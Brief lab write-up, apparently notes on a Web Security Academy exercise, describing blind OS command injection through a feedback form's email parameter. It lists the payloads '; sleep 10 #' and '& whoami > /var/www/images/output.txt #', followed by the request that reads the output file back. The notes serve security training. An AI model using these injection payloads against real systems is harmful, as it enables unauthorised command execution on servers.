# Blind OS command injection with output redirection

1. Command injection: feedback function.
2. Goal: execute the whoami command and retrieve the output.

### Analysis
- Website target: `https://0afc001e04d1330b80bf9453001c0018.web-security-academy.net/`
- Use Burp suite.
- `ctrl + u`: URL encode.
- You should `submit feedback`.

1. Confirm blind command injection.
```bash
; sleep 10 #
# email parameter.
```

2. Check where images are store.
```bash
# Look at proxy history to see images directory.
# Checl image filters in burpsuite.
/var/www/images/
```

3. Redirect output to file.
```bash
& whoami > /var/www/images/output.txt #
```

4. Check if file was created.
```bash
# Open random image file that we send to repeater.
GET /image?filename=output.txt HTTP/2
# I got username: peter-BUpMk9.
```